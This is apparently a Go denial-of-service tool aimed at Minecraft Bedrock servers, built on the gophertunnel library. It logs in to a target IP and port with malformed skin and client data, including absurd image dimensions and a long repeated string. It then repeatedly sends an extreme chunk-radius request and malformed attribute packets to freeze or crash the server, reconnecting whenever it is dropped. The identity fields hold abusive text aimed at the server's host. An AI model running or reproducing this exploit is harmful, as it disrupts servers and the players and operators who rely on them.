package main

import (
	"fmt"
	"log"
	"os"
	"time"
    "strings"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/auth"
	"github.com/sandertv/gophertunnel/minecraft/protocol"
	"github.com/sandertv/gophertunnel/minecraft/protocol/login"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
)

func main() {
	if len(os.Args) < 3 {
		log.Fatalf("Usage: %s <target IP> <target port>", os.Args[0])
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]

	aid := []login.PersonaPiece{
		{
			Default: true,
			PackID:  "1111111",
			PieceID: "-1",
		},
	}

    imageString := strings.Repeat("FREE DATA GIVES DIVINE STD", 2425)
    animatedImageData := []login.SkinAnimation{
        {
            Image: imageString,
            ImageHeight: 1000000000000,
            ImageWidth: 10000000000000000,
            Frames: -11111111111111111111,
            AnimationExpression: 1111111111111111011,
        },
    }
	clientData := login.ClientData{
		ThirdPartyNameOnly: true,
		MaxViewDistance:    0,   // Better altay is retarded accept
		MemoryTier:         1000000, // Typical memory tier
		IsEditorMode:       false,
		DeviceModel:        "device_model",
		GameVersion:        "1.21.50", // .41 :(
		PremiumSkin:        true,
		ThirdPartyName:     "Username",
		SkinData:           "fffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffff",
		CurrentInputMode:   1,
		CapeData:           "hgfhnghnfngfhnf",
		SelfSignedID:       "FFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
		GUIScale:           1111,
		ServerAddress:      "0.0.0.0w:19132",
		TrustedSkin:        true,
		OverrideSkin:       true,
		PersonaPieces:      aid,
		ArmSize:            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        SkinGeometry: "arpa/inet.h bombing",
        SkinID: "Valve source engine query boom?",
        SkinColour: "greeeeeeeeeeeeeeeeeeeeeeen",
        AnimatedImageData: animatedImageData,
	}

	identityData := login.IdentityData{
		DisplayName: "XS FLOOD", // USELESS FOR NOW
		TitleID:     "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		XUID:        "GO FUCK YOURSELF STUPID SHITTY ASS SERVER I FUCK YOUR HOST ALL TIME",
		Identity:    "noneoefrdsfisdyfe8s79ifdoyrdpisot",
	}

	dialer := minecraft.Dialer{
		ClientData:   clientData,
		IdentityData: identityData,
		TokenSource:  auth.TokenSource,
	}

	for {
		var conn *minecraft.Conn
		var err error
		baseDelay := time.Second

		for {
			conn, err = dialer.Dial("raknet", targetIP+":"+targetPort)
			if err == nil {
				log.Println("Sent login dial")
				sendMultipleDials(conn, 5000000)
				break
			}
			log.Printf("Error (may be outdated client or spawn): %v. Retrying in %v...\n", err, baseDelay)
			time.Sleep(baseDelay)
			baseDelay = 1
			if baseDelay > time.Minute {
				baseDelay = time.Minute
			}
		}

		if err := conn.DoSpawn(); err != nil {
			log.Printf("DoSpawn error: %v", err)
			continue
		}

		// Read packets from the connection until finish
		for {
			pk, err := conn.ReadPacket()
			if err != nil {
				log.Printf("ReadPacket error: %v. Reconnecting...\n", err)
				break
			}

			switch p := pk.(type) {
			case *packet.Emote:
				fmt.Printf("Emote packet received: %v\n", p.EmoteID)
			case *packet.MovePlayer:
				fmt.Printf("Player %v moved to %v\n", p.EntityRuntimeID, p.Position)
			}

			// Wont crash pm cuz theres max render of 32 chunks,
			//unlike better altay it will accept and freeze
			p := &packet.RequestChunkRadius{ChunkRadius: 100000000}
			if err := conn.WritePacket(p); err != nil {
				log.Printf("WritePacket error: %v. Reconnecting...\n", err)
				break
			}

			p3 := &packet.UpdateAttributes{
				EntityRuntimeID: 10101010100101111,
				Tick:            1119019100000009,
				Attributes: []protocol.Attribute{
					{
						DefaultMin: 1000000000,
						DefaultMax: -111110111,
						Modifiers: []protocol.AttributeModifier{
							{
								Name:   "health _inet",
								ID:     "YOOOOOOOOOOOOOOOOOOOOOO0000000000000000OOO",
								Amount: -111000,
							},
						},
					},
				},
			}

			if err := conn.WritePacket(p3); err != nil {
				log.Printf("WritePacket error: %v. Reconnecting...\n", err)
				break
			}

		}
	}
}

func sendMultipleDials(conn *minecraft.Conn, numDials int) {
	for i := 0; i < numDials; i++ {
		//log.Printf("Dial #%d sent\n", i+1)
	}
}
